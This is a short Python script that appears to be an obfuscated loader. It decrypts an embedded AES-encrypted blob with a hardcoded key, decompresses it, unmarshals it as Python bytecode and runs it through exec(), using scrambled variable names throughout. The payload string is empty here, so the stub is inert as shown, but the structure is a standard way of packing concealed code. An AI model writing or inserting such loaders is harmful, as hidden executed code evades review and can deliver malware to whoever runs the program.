
import base64, zlib, marshal
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

qotkuzuiuP = b'QfueydoojTWwLoJX'

pcLoTeII = ""
ppiJjEbl = base64.b64decode(pcLoTeII)

hmfiiLaq = AES.new(qotkuzuiuP, AES.MODE_ECB)
cPIbgPcy = unpad(hmfiiLaq.decrypt(ppiJjEbl), AES.block_size)

exec(marshal.loads(zlib.decompress(cPIbgPcy)))
